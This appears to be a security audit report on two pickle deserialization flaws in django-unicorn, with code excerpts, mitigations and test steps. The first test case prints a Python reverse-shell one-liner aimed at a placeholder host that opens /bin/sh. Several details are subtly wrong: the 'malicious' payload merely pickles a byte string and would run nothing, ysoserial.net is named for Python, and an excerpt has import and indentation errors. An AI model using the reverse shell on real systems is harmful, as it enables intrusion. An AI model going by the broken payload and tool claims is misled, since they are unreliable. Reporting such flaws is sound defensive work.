### Vulnerability List:

- [Unsafe Deserialization via Pickle in Component Caching](#unsafe-deserialization-via-pickle-in-component-caching)
- [Unsafe Deserialization via Pickle in Component Resetting](#unsafe-deserialization-via-pickle-in-component-resetting)

### Unsafe Deserialization via Pickle in Component Caching

- Description:
    - Django-unicorn uses `pickle` for caching component state in `django_unicorn\cacher.py`. The `cache_full_tree` function serializes the component and its children using `pickle.dumps`, and `restore_from_cache` deserializes it using `pickle.loads`.
    - Pickle is known to be insecure when used to deserialize data from untrusted sources. A malicious attacker could craft a pickled payload that, when deserialized by the server, executes arbitrary code on the server.
    - An attacker could potentially exploit this if they can control or influence the cached data, such as by manipulating the component's cache key or by injecting malicious data into the cache backend if the cache is shared or exposed.

- Impact:
    - **Critical**
    - Remote Code Execution (RCE). An attacker can execute arbitrary Python code on the server hosting the Django application. This can lead to full server compromise, data breach, and other severe security incidents.

- Vulnerability Rank:
    - critical

- Currently implemented mitigations:
    - None. The project uses `pickle` for serialization and deserialization without any apparent sanitization or security measures.

- Missing mitigations:
    - Replace `pickle` with a safer serialization format like `json` or `orjson` (which is already used in the project for other serialization tasks) for component caching.
    - Implement integrity checks for cached data, such as using HMAC to sign the cached data and verify its integrity before deserialization. However, switching away from pickle is strongly recommended as primary mitigation.

- Preconditions:
    - Caching must be enabled in django-unicorn settings (`UNICORN['SERIAL']['ENABLED'] = True`).
    - A cache backend that persists data between requests must be in use (e.g., Redis, Memcached, Database cache, not Local-memory cache when running multiple processes).
    - An attacker needs to find a way to influence or control the data stored in the cache, or potentially hijack or poison the cache itself.

- Source code analysis:
    - File: `django_unicorn\cacher.py`

    ```python
    from django_unicorn.cacher import cache_full_tree, restore_from_cache

    def cache_full_tree(component: "django_unicorn.views.UnicornView"):
        ...
        with CacheableComponent(root) as caching:
            for _component in caching.components():
                cache.set(_component.component_cache_key, _component) # Serialization using pickle.dumps inside cache.set

    def restore_from_cache(
            component_cache_key: str,
            request: Optional[HttpRequest] = None
        ) -> "django_unicorn.views.UnicornView":
        ...
        cached_component = cache.get(component_cache_key) # Deserialization using pickle.loads inside cache.get

        if cached_component:
            ...
    ```

    - The code directly uses `cache.set` and `cache.get` from Django's cache framework. Django's cache backends, when used with default serializers (like `pickle`), are vulnerable to deserialization attacks if the cache data is not properly secured.
    - The `CacheableComponent` class in `django_unicorn\cacher.py` prepares the component for caching and performs pickle serialization without any security measures.
    - The `restore_from_cache` function retrieves the cached component and deserializes it, making the application vulnerable if the cached data is compromised.

- Security test case:
    1. Setup django-unicorn with caching enabled in `settings.py`:
        ```python
        UNICORN = {
            "SERIAL": {"ENABLED": True},
            "CACHE_ALIAS": "default",
        }
        CACHES = {
            "default": {
                "BACKEND": "django.core.cache.backends.locmem.LocMemCache", # or any persistent cache like redis
                "LOCATION": "unique-snowflake",
            }
        }
        ```
    2. Create a simple django-unicorn component.
    3. In a view that uses this component, trigger an action that causes the component to be cached (e.g., a simple counter component that caches its state after incrementing).
    4. Identify the cache key used for the component (e.g., by logging `component.component_cache_key` before `cache_full_tree` call).
    5. Craft a malicious pickled payload. This payload should execute a reverse shell or similar harmful code upon deserialization. You can use tools like `pickletools` or `ysoserial.net` (if creating payload in python) to craft this payload, targeting Python's pickle vulnerability. Example of malicious pickle payload creating reverse shell (this is just example, needs to be adapted for the target environment and potentially encoded in base64 if needed for cache insertion):
        ```python
        import pickle
        import base64
        import os

        # Reverse shell payload (example, adjust IP and port)
        command = b'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",YOUR_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''

        malicious_payload = base64.b64encode(pickle.dumps(command))
        print(malicious_payload.decode())
        ```
    6. Manually insert the malicious pickled payload into the cache backend, using the identified cache key from step 4. If using `locmem` cache, you would need to access the internal cache dictionary (not recommended for production testing against real cache backend, use redis-cli or similar tools for actual backend). If using Redis or Memcached, use the respective client libraries or command-line tools to set the cache value.  If using `locmem` for local testing, you might need to manually access the cache dictionary via Django internals for testing.
    7. Trigger an action in the application that causes the component to be restored from the cache using `restore_from_cache` function. This action should correspond to the component associated with the cache key you poisoned.
    8. If successful, the malicious payload will be deserialized, and the attacker's code (reverse shell in the example) will be executed on the server. Verify code execution by checking for a reverse shell connection or observing other side effects of the payload.

This vulnerability allows for critical impact and has high likelihood of successful exploitation if caching is enabled and the cache backend is accessible or manipulable, thus ranked as **critical**.

### Unsafe Deserialization via Pickle in Component Resetting

- Description:
    - Django-unicorn uses `pickle` for serializing and deserializing component attribute values in the `django_unicorn\components\unicorn_view.py` `reset` method.
    - The `_set_resettable_attributes_cache` function serializes attributes of type `UnicornField` and Django Models without PK using `pickle.dumps`.
    - The `reset` function deserializes these pickled values using `pickle.loads` when the component's `reset()` method is called, for example via `$reset` action.
    - Pickle is known to be insecure. A malicious attacker could craft a pickled payload that, if somehow placed into `_resettable_attributes_cache` and then deserialized by the server during a reset, could execute arbitrary code on the server.
    - The exploitability depends on the ability of an attacker to influence or control the pickled data in `_resettable_attributes_cache`.

- Impact:
    - **High** (potentially Critical depending on exploitability).
    - Remote Code Execution (RCE). An attacker can execute arbitrary Python code on the server if they can control the pickled data for resettable attributes and trigger a component reset. This can lead to server compromise, data breach, and other security incidents.

- Vulnerability Rank:
    - high

- Currently implemented mitigations:
    - None. Pickle is used for serialization and deserialization without any sanitization.

- Missing mitigations:
    - Replace `pickle` with a safer serialization format like `json` or `orjson` for serializing resettable attributes.
    - Implement integrity checks for cached data if pickle is essential, though switching to a safer format is highly recommended.

- Preconditions:
    - The component must have resettable attributes, meaning it must have attributes of type `UnicornField` or Django `Model` without a primary key.
    - An attacker needs to find a way to influence or control the pickled data stored in `_resettable_attributes_cache`. Further investigation is needed to determine a practical attack vector.
    - The attacker must be able to trigger a component reset, for example by sending a `$reset` action.

- Source code analysis:
    - File: `django_unicorn\components\unicorn_view.py`

    ```python
    class UnicornView(TemplateView):
        ...
        @timed
        def _set_resettable_attributes_cache(self) -> None:
            """
            Caches the attributes that are "resettable" in `_resettable_attributes_cache`.
            Cache is a dictionary with key: attribute name; value: pickled attribute value
            """
            self._resettable_attributes_cache = {}

            for attribute_name, attribute_value in self._attributes().items():
                if isinstance(attribute_value, UnicornField):
                    self._resettable_attributes_cache[attribute_name] = pickle.dumps(attribute_value) # Serialization using pickle.dumps
                elif isinstance(attribute_value, Model) and not attribute_value.pk:
                    if attribute_name not in self._resettable_attributes_cache:
                        try:
                            self._resettable_attributes_cache[attribute_name] = pickle.dumps(attribute_value) # Serialization using pickle.dumps
                            except pickle.PickleError:
                                logger.warn(...)


        @timed
        def reset(self):
            for (
                attribute_name,
                pickled_value,
            ) in self._resettable_attributes_cache.items():
                try:
                    attribute_value = pickle.loads(pickled_value)  # Deserialization using pickle.loads
                    self._set_property(attribute_name, attribute_value)
                except pickle.PickleError:
                    logger.warn(...)
    ```

    - The `_set_resettable_attributes_cache` method serializes component attributes using `pickle.dumps`.
    - The `reset` method deserializes these pickled values using `pickle.loads`, creating a vulnerability if attacker can control the pickled data.

- Security test case:
    1. Create a django-unicorn component with a `UnicornField` attribute:
        ```python
        from django_unicorn import UnicornView, UnicornField

        class MyField(UnicornField):
            value = "initial"

        class ResetComponent(UnicornView):
            my_field = MyField()

            def call_reset(self):
                self.reset() # Calls reset method
        ```
    2. Create a view that renders this component.
    3. Craft a malicious pickled payload that executes arbitrary code upon deserialization (similar to the caching vulnerability test case).
    4. **This step is theoretical and requires further research to find a practical attack vector:** Assume there's a way to inject or replace the pickled value for `my_field` in `_resettable_attributes_cache`. This might involve session manipulation or other techniques depending on how `_resettable_attributes_cache` is managed and potentially persisted. For testing, you might need to manually modify the internal state during a debugging session.
    5. Replace the pickled value for `my_field` in the component's `_resettable_attributes_cache` with the malicious payload.
    6. Trigger the `call_reset` action on the component from the client-side, which will call `self.reset()` on the server.
    7. The `pickle.loads` in the `reset` method will deserialize the malicious payload.
    8. Verify code execution by observing the effects of the malicious payload (e.g., reverse shell).

This vulnerability is ranked **high**. The impact is RCE, but the practical exploit vector to control `_resettable_attributes_cache` needs further investigation to assess the likelihood of exploitation in a real-world scenario. If a reliable way to inject malicious pickle data into `_resettable_attributes_cache` is found, the rank should be elevated to critical.
